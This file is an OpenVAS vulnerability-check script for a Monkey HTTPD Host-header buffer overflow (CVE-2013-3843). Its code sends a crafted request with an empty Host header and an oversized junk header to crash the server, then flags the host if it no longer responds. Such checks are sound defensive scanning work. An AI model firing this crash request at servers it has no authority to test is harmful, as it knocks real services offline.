###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_monkey_httpd_host_header_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Monkey HTTPD Host Header Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let remote unauthenticated attackers to
  cause a denial of service or execute arbitrary code.
  Impact Level: System/Application";

tag_affected = "Monkey HTTPD vesion 1.2.0 and prior.";
tag_insight = "The flaw is due to an error when handling certain Long requests sent
  via 'Host' field, which can be exploited to cause a denial of service
  or remote code execution.";
tag_solution = "No solution or patch is available as of 05th, June 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://monkey-project.com";
tag_summary = "This host is running Monkey HTTPD and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(803711);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-3843");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-05 11:55:02 +0530 (Wed, 05 Jun 2013)");
  script_name("Monkey HTTPD Host Header Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://pastebin.com/7b0ZKNtm");
  script_xref(name : "URL" , value : "http://bugs.monkey-project.com/ticket/182");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/monkey-120-buffer-overflow");

  script_description(desc);
  script_summary("Check Monkey HTTPD is vulnerable to BoF");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 2001);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

req = "";
res = "";
port = "";

## Get HTTP Port
port = get_http_port(default:2001);
if(!port){
  port =  2001;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

banner = get_http_banner(port:port);

if(http_is_dead(port:port)) exit(0);

## Confirm the application before trying exploit
if("Server: Monkey" >!< banner){
  exit(0);
}

req = string("GET / HTTP/1.1\r\n",
             "Host: \r\n",
             "Bad: ",  crap(data:"0x41", length:2511), "\r\n\r\n");

res = http_keepalive_send_recv(port:port, data:req);

## Send and Receive the response
req = http_get(item:"/",  port:port);
res = http_send_recv(port:port, data:req);

## Confirm the server is dead or not
if(!res && http_is_dead(port:port))
{
  security_hole(port);
  exit(0);
}
